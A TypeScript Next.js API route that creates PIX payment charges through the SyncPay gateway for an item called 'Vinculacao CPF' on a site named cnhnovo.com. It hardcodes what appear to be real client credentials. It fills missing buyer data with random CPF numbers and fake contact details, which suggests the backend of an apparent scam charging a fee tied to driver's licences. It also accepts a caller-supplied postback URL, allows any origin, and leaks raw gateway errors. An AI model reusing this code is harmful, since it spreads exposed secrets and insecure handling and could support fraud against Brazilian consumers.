import { NextRequest, NextResponse } from "next/server"

const SYNCPAY_BASE_URL = "https://api.syncpayments.com.br"
const SYNCPAY_CLIENT_ID = "6025b61a-129e-48b5-a5bf-82b89b850e40"
const SYNCPAY_CLIENT_SECRET = "1aa78add-1139-4022-9310-9618f399aca2"

let cachedToken: string | null = null
let tokenExpiresAt = 0
let lastRequestTime = 0
const MIN_REQUEST_INTERVAL = 2000

const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms))

async function fetchWithRetry(url: string, options: RequestInit, maxRetries = 3) {
  let lastError: Error | null = null

  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const timeSinceLastRequest = Date.now() - lastRequestTime
    if (timeSinceLastRequest < MIN_REQUEST_INTERVAL) {
      await delay(MIN_REQUEST_INTERVAL - timeSinceLastRequest)
    }

    try {
      lastRequestTime = Date.now()
      const response = await fetch(url, options)

      if (response.status === 429) {
        const retryAfter = response.headers.get("retry-after")
        const waitTime = retryAfter ? parseInt(retryAfter) * 1000 : Math.pow(2, attempt + 1) * 1000
        await delay(waitTime)
        continue
      }

      return response
    } catch (error) {
      lastError = error as Error
      const waitTime = Math.pow(2, attempt + 1) * 1000
      await delay(waitTime)
    }
  }

  throw lastError || new Error("Max retries exceeded")
}

async function getAuthToken() {
  if (cachedToken && Date.now() < tokenExpiresAt - 300000) {
    return cachedToken
  }

  const authResp = await fetchWithRetry(`${SYNCPAY_BASE_URL}/api/partner/v1/auth-token`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
    },
    body: JSON.stringify({
      client_id: SYNCPAY_CLIENT_ID,
      client_secret: SYNCPAY_CLIENT_SECRET,
    }),
  })

  if (!authResp.ok) {
    const errorText = await authResp.text()
    throw new Error(`Erro ao obter token: ${errorText}`)
  }

  const authData = await authResp.json()
  cachedToken = authData.access_token
  tokenExpiresAt = Date.now() + authData.expires_in * 1000

  return cachedToken
}

function normalizeAmount(rawAmount: unknown) {
  if (rawAmount == null) return { amountCents: 100, amountNum: 1 }
  if (typeof rawAmount === "string") {
    const cleaned = rawAmount.replace(/[^\d,.-]/g, "").replace(",", ".")
    const n = parseFloat(cleaned)
    if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 }
    return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n }
  }
  const n = Number(rawAmount)
  if (!Number.isFinite(n)) return { amountCents: 100, amountNum: 1 }
  if (Number.isInteger(n) && n >= 1000) {
    const num = n / 100
    return { amountCents: Math.max(1, Math.round(num * 100)), amountNum: num }
  }
  return { amountCents: Math.max(1, Math.round(n * 100)), amountNum: n }
}

export async function OPTIONS() {
  return new NextResponse(null, {
    status: 204,
    headers: {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, Authorization",
      "Access-Control-Allow-Methods": "GET,POST,OPTIONS",
    },
  })
}

export async function POST(request: NextRequest) {
  let body: Record<string, unknown> = {}
  try {
    body = await request.json()
  } catch {
    body = {}
  }

  const randDigits = (len: number) =>
    Array.from({ length: len }, () => Math.floor(Math.random() * 10)).join("")
  const randId = randDigits(6)
  const rawAmount = body.amount ?? body.valor ?? body.total ?? 84.9
  const { amountCents, amountNum } = normalizeAmount(rawAmount)
  const customerName = (body.nome || body.name || body.customer_name || `Cliente ${randId}`).toString()
  const customerEmail = (body.email || body.customer_email || `cliente${randId}@example.com`).toString()
  const customerPhone = (body.phone || body.customer_phone || `11${randDigits(9)}`)
    .toString()
    .replace(/\D/g, "")
  const cpfRaw = (body.cpf || body.document || body.customer_cpf || randDigits(11))
    .toString()
    .replace(/\D/g, "")
  const customerCpf = cpfRaw.padEnd(11, "0").slice(0, 11)
  const tracking = (body.tracking || body.rastreio || body.codigo || `pedido-${randId}`).toString()

  let token: string
  try {
    token = await getAuthToken()
  } catch (err) {
    return NextResponse.json(
      { success: false, error: "Erro de autenticação com o serviço de pagamento. Tente novamente." },
      { status: 500 }
    )
  }

  const expiresDate = new Date()
  expiresDate.setDate(expiresDate.getDate() + 2)
  const expiresInDays = expiresDate.toISOString().split("T")[0]

  const payload = {
    ip: "127.0.0.1",
    pix: { expiresInDays },
    items: [{ title: "Vinculacao CPF", quantity: 1, tangible: false, unitPrice: amountCents }],
    amount: amountCents,
    customer: {
      cpf: customerCpf,
      name: customerName,
      email: customerEmail,
      phone: customerPhone,
      externaRef: tracking,
      address: {
        city: "Sao Paulo",
        state: "SP",
        street: "Rua Exemplo",
        country: "BR",
        zipCode: "01000-000",
        complement: "",
        neighborhood: "Centro",
        streetNumber: "123",
      },
    },
    metadata: {
      provider: "CNHNOVO",
      sell_url: "https://cnhnovo.com",
      order_url: "https://cnhnovo.com/pedido",
      user_email: customerEmail,
      user_identitication_number: customerCpf,
    },
    traceable: true,
    postbackUrl: process.env.POSTBACK_URL || (body.postback as string) || "https://cnhnovo.com/api/webhook",
  }

  const syncResp = await fetchWithRetry(`${SYNCPAY_BASE_URL}/v1/gateway/api`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Accept: "application/json",
      Authorization: `Bearer ${token}`,
    },
    body: JSON.stringify(payload),
  })

  const text = await syncResp.text()

  if (!syncResp.ok) {
    let userMessage = "Erro ao criar PIX. Tente novamente."
    if (syncResp.status === 429) {
      userMessage = "Sistema ocupado. Aguarde alguns segundos e tente novamente."
    } else if (syncResp.status >= 500) {
      userMessage = "Serviço temporariamente indisponível. Tente novamente em alguns minutos."
    }
    return NextResponse.json({ success: false, error: userMessage, details: text }, { status: syncResp.status })
  }

  let data: Record<string, unknown> = {}
  try {
    data = JSON.parse(text)
  } catch {
    data = {}
  }

  const brcode = (data?.paymentCode as string) || null
  const qrcodeFinal = data?.paymentCodeBase64
    ? `data:image/png;base64,${data.paymentCodeBase64}`
    : null
  const paymentId = (data?.idTransaction as string) || null

  return NextResponse.json({
    success: true,
    pix_code: brcode,
    transaction_id: paymentId,
    deposit_id: paymentId,
    qrcode: qrcodeFinal,
    amount: amountNum,
    key: null,
    brcode,
    payload: brcode,
    pixCode: brcode,
    pix: { key: null, brcode, qrcode: qrcodeFinal, payload: brcode },
    raw: data,
  })
}
